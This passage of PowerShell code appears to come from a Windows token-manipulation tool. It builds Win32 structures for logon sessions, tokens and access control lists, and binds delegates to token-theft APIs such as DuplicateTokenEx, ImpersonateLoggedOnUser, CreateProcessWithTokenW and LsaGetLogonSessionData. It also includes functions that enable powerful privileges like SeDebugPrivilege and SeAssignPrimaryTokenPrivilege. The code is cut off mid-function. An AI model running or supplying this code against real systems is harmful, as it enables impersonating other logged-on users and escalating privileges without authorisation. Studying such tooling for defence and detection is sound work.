    $TypeBuilder.DefineField('DynamicCharged', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicAvailable', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
	$TOKEN_STATISTICS = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
	$TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
	$TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Username', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginDomain', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('AuthenticationPackage', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Session', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sid', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginServer', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('DnsDomainName', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('Upn', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('UserFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('LastLogonInfo', $LSA_LAST_INTER_LOGON_INFO, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonScript', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('ProfilePath', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectory', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectoryDrive', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogoffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('KickOffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordLastSet', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordCanChange', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
	$TOKEN_ELEVATION = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		
    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACE_HEADER', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AceType', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceFlags', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceSize', [UInt16], 'Public') | Out-Null
    $ACE_HEADER = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACL', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AclRevision', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz1', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AclSize', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceCount', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz2', [UInt16], 'Public') | Out-Null
    $ACL = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACCESS_ALLOWED_ACE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('Header', $ACE_HEADER, 'Public') | Out-Null
    $TypeBuilder.DefineField('Mask', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('SidStart', [UInt32], 'Public') | Out-Null
    $ACCESS_ALLOWED_ACE = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TRUSTEE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('pMultipleTrustee', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('MultipleTrusteeOperation', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeForm', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ptstrName', [IntPtr], 'Public') | Out-Null
    $TRUSTEE = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('EXPLICIT_ACCESS', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('grfAccessPermissions', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfAccessMode', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfInheritance', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Trustee', $TRUSTEE, 'Public') | Out-Null
    $EXPLICIT_ACCESS = $TypeBuilder.CreateType()
    


    
    
    
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
	$GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	$GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    

    $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
	$SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
	$SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
	$LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	$LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
	$LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	$LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)

    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)

    $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
    $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    $OpenWindowStationW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenWindowStationWAddr, $OpenWindowStationWDelegate)

    $OpenDesktopAAddr = Get-ProcAddress user32.dll OpenDesktopA
    $OpenDesktopADelegate = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)

    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)

    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)

    $GetSecurityInfoAddr = Get-ProcAddress advapi32.dll GetSecurityInfo
    $GetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    $GetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetSecurityInfoAddr, $GetSecurityInfoDelegate)

    $SetSecurityInfoAddr = Get-ProcAddress advapi32.dll SetSecurityInfo
    $SetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $SetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetSecurityInfoAddr, $SetSecurityInfoDelegate)

    $GetAceAddr = Get-ProcAddress advapi32.dll GetAce
    $GetAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $AddAccessAllowedAceAddr = Get-ProcAddress advapi32.dll AddAccessAllowedAce
    $AddAccessAllowedAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    $AddAccessAllowedAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddAccessAllowedAceAddr, $AddAccessAllowedAceDelegate)

    $CreateWellKnownSidAddr = Get-ProcAddress advapi32.dll CreateWellKnownSid
    $CreateWellKnownSidDelegate = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $CreateWellKnownSid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateWellKnownSidAddr, $CreateWellKnownSidDelegate)

    $SetEntriesInAclWAddr = Get-ProcAddress advapi32.dll SetEntriesInAclW
    $SetEntriesInAclWDelegate = Get-DelegateType @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $SetEntriesInAclW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetEntriesInAclWAddr, $SetEntriesInAclWDelegate)

    $LocalFreeAddr = Get-ProcAddress kernel32.dll LocalFree
    $LocalFreeDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)

    $LookupPrivilegeNameWAddr = Get-ProcAddress advapi32.dll LookupPrivilegeNameW
    $LookupPrivilegeNameWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $LookupPrivilegeNameW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeNameWAddr, $LookupPrivilegeNameWDelegate)
    


    
    Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw ""Cannot add bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


    
    function Enable-SeAssignPrimaryTokenPrivilege
    {	
	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw ""Unable to get the handle to the current thread""
	    }
		
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, ""SeAssignPrimaryTokenPrivilege"", [Ref] $LuidObject)

	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
    }


    
    function Enable-Privilege
    {
        Param(
            [Parameter()]
            [ValidateSet(""SeAssignPrimaryTokenPrivilege"", ""SeAuditPrivilege"", ""SeBackupPrivilege"", ""SeChangeNotifyPrivilege"", ""SeCreateGlobalPrivilege"",
                ""SeCreatePagefilePrivilege"", ""SeCreatePermanentPrivilege"", ""SeCreateSymbolicLinkPrivilege"", ""SeCreateTokenPrivilege"",
                ""SeDebugPrivilege"", ""SeEnableDelegationPrivilege"", ""SeImpersonatePrivilege"", ""SeIncreaseBasePriorityPrivilege"",
                ""SeIncreaseQuotaPrivilege"", ""SeIncreaseWorkingSetPrivilege"", ""SeLoadDriverPrivilege"", ""SeLockMemoryPrivilege"", ""SeMachineAccountPrivilege"",
                ""SeManageVolumePrivilege"", ""SeProfileSingleProcessPrivilege"", ""SeRelabelPrivilege"", ""SeRemoteShutdownPrivilege"", ""SeRestorePrivilege"",
                ""SeSecurityPrivilege"", ""SeShutdownPrivilege"", ""SeSyncAgentPrivilege"", ""SeSystemEnvironmentPrivilege"", ""SeSystemProfilePrivilege"",
                ""SeSystemtimePrivilege"", ""SeTakeOwnershipPrivilege"", ""SeTcbPrivilege"", ""SeTimeZonePrivilege"", ""SeTrustedCredManAccessPrivilege"",
                ""SeUndockPrivilege"", ""SeUnsolicitedInputPrivilege"")]
            [String]
            $Privilege
        )

	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw ""Unable to get the handle to the current thread""
	    }
		
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)

	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

